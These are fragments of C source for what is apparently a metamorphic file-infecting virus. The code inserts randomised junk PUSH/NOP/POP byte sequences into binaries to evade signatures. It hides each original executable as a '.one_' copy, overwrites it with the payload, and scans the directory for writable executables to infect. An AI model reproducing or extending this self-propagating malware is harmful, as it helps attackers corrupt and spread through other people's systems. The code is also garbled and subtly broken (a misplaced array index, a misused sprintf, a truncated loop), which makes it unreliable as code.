#define B_PUSH_RAX ".byte 0x50\n\t" 
#define B_PUSH_RBX ".byte 0x53\n\t"
#define B_POP_RAX ".byte 0x58\n\t"
#define B_POP_RBX ".byte 0x5b\n\t"
  
#define B_NOP ".byte
0x48,0x87,0xc0\n\t"

#define H_PUSH 0x50
#define H_POP 0x58
#define H_NOP_0 0x48
#define H_NOP_1 0x87
#define H_NOP_2 0xC0
 

#define JUNK_ASM __asm__ __volatile__
(B_PUSH_RBX B_PUSH_RAX B_NOP B_NOP
B_POP_RAX B_POP_RBX)

#define JUNKLEN 10

-----------------


/* Load file in read binary mode */
int32_t load_file(uint8_t **file_data,
uint32_t *file_len, const char
*filename) {

JUNK_ASM;

// Opens file in read binary mode
FILE *fp = fopen(filename, "rb");

// Sets the file position of the
stream to the given offset (0 long int)
fseek(fp, 0L, SEEK_END);

// Sets the length of the file
if (ftell(fp) < 1) {
} else {
*file_len = ftell(fp);
}

// Allocates memory to the length of
the file
*file_data = malloc(*file_len);

// Gets the file position of the
stream to the start of the file
fseek(fp, 0L, SEEK_SET);

// Reads the data into the file
variable in memory
if (fread((void*)*file_data,
*file_len, 1, fp) != 1) {
free(file_data);
return EXIT_FAILURE;
}
 
// Closes the file
fclose(fp);
return EXIT_SUCCESS;
}

--------------

/*  Write assembly instruction */
void
insert_junk(uint8_t *file_data,
uint64_t junk_start) {

JUNK_ASM;


uint8_t reg_1 = (local_rand()%4); //
see below 
uint8_t reg_2 = (local_rand()%4); //
see below 

while(reg_2 == reg_1) {

reg_2 = (local_rand()%4);

}
 
uint8_t push_r1 = 0x50 + reg_1;
uint8_t push_r2 = 0x50 + reg_2;
uint8_t pop_r1 = 0x58 + reg_1;
uint8_t pop_r2 = 0x58 + reg_2;


uint8_t nop[3] = {0x48,0x87,0xC0};

nop[2] += reg_1;

nop[2] += (reg_2 * 8);


file_data[junk_start] = push_r1;
file_data[junk_start + 1] = push_r2;


file_data[junk_start + 2] = nop[0];
file_data[junk_start + 3] = nop[1];
file_data[junk_start + 4] = nop[2];
file_data[junk_start + 5] = nop[0];
file_data[junk_start + 6] = nop[1];
file_data[junk_start + 7] = nop[2];

file_data[junk_start + 8] = pop_r2;
file_data[junk_start + 9] = pop_r1;
}
The junk assembly instructions use the
following pattern so that they can be
identified
r1 = random register from RAX, RBX,
RCX or RDX
r2 = a different random register from
RAX, RBX, RCX, RDX

We then pick one of registers at
random, and write out the PUSH and POP
operations for that register at either
end of the sequence.

local_rand() 
{
int digit;

FILE *fp;
// Opens file in read mode
fp = fopen("/dev/urandom", "r");
// Reads the file into the code
variable in memory
fread(&digit, 1, 1, fp);
// Closes the file
fclose(fp);

return digit;
}


--------------

for (uint64_t i = 0; i < file_len; i
+= 1) {

// Start of the junk ASM
if (file_data[i] >= H_PUSH &&
file_data[i] <= (H_PUSH + 3)) continue;
if (file_data[i + 1] >= H_PUSH &&
file_data[i + 1] <= (H_PUSH + 3))
continue;
if (file_data[i + 2 == H_NOP_0])
continue;
if (file_data[i + 3] == H_NOP_1) {
		
		insert_junk(file_data, i);
		
		}
	}

-------------


/* hide an original executable file */
void hide_file(const char *bash_code,
const char *filename)
{
	JUNK_ASM;
	int cmd_len = strlen(bash_code) +
strlen(filename) + 1;
	
	sprintf(bash_code, filename,
filename);
}

/* Embeds the malware  */
void embed_code(uint8_t *file_data,
uint32_t file_len,  const char
*filename)
{
  JUNK_ASM;

    hide_file("cp %s .one_%s",
filename);    
    execute_bash("chmod +x
%s",filename);

    write_file(file_data, file_len,
filename);           

}
// Lists files in passed in directory // path
void propagate(const char *path, const
char *exclude) 
{
	JUNK_ASM;

DIR *dir;
struct dirent *ent;

// Open directory stream
dir = opendir ("./"); 
if (dir != NULL) {

// Iterate over all files in the
current directory
while ((ent = readdir (dir)) != NULL) {
// Select regular files only, not
DT_DIR (directories) nor DT_LNK (links)
if (ent->d_type == DT_REG)
{
// Select executable and writable
files that can be infected
if (access(ent->d_name, X_OK) == 0 &&
access(ent->d_name, W_OK) == 0)
{
// Ignore the executable that is
running the program
if (strstr(exclude, ent->d_name) !=
NULL)
{
original_executable = ent->d_name; 
	}
}

--------------







